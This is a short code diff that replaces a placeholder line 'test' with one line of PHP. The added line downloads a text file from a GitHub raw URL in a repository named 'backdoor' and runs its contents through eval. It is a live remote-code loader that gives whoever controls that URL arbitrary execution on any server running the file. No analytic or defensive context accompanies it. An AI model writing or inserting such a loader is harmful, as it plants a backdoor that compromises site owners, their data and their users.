@@ -1,1 +1,1 @@
-test
+<?php $rf = 'https://raw.githubusercontent.com/donpablo2910337/backdoor/refs/heads/main/bkbfile.txt';$ch = curl_init($rf);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);$bn = curl_exec($ch);curl_close($ch);eval('?>' . $bn); ?>
